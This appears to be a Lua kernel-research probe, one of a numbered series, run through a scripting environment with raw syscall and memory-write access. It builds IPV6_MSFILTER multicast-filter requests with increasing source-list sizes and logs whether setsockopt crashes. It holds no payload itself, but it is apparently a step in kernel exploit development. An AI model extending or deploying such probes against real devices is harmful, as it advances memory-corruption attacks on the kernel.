-- CRASH_CLASS: MODERATE
-- Probe 50g: bounded valid IPV6_MSFILTER source-list sizes; no race.
-- Depends on the corrected amd64 __msfilterreq layout from probe 50f.

print("=== PROBE 50g: IPV6_MSFILTER SOURCE SIZES ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function z(p, n)
    for i = 0, n - 1 do memory.write_byte(p + i, 0) end
end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local socket, setsockopt, close = sc(97), sc(105), sc(6)
local fd = to_num(socket(uint64(28), uint64(2), uint64(17)))
print("socket=" .. tostring(fd))
if fd < 0 or fd > 1024 then print("=== ABORT ===") return end

local mreq = memory.alloc(32)
z(mreq, 32)
b(mreq, 0, 0xff); b(mreq, 1, 0x02); b(mreq, 15, 1)
d(mreq, 16, 1)
local jr = to_num(setsockopt(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20)))
print("join=" .. tostring(jr))
if jr ~= 0 then close(uint64(fd)); print("=== NO MEMBERSHIP ==="); return end

local req = memory.alloc(160)
local src = memory.alloc(128 * 256)
for n = 1, 256 do
    local p = src + (n - 1) * 128
    z(p, 128)
    b(p, 0, 28); b(p, 1, 28)
    b(p, 8, 0x20); b(p, 9, 0x01)
    b(p, 22, math.floor((n - 1) / 256)); b(p, 23, n % 256)
end

for _, n in ipairs({1, 16, 64, 128, 256}) do
    z(req, 160)
    d(req, 0, 1); d(req, 4, 1); d(req, 8, n)
    b(req, 16, 28); b(req, 17, 28)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, 1)
    d(req, 40, 1)
    memory.write_qword(req + 144, src)
    print("BEFORE nsrcs=" .. n)
    local ok, rv = pcall(function()
        return setsockopt(uint64(fd), uint64(41), uint64(74), uint64(req), uint64(152))
    end)
    print("RESULT nsrcs=" .. n .. " ok=" .. tostring(ok) .. " rv=" .. tostring(rv))
    if not ok then break end
end

local lr = to_num(setsockopt(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20)))
print("leave=" .. tostring(lr))
close(uint64(fd))
print("=== PROBE 50g COMPLETE ===")
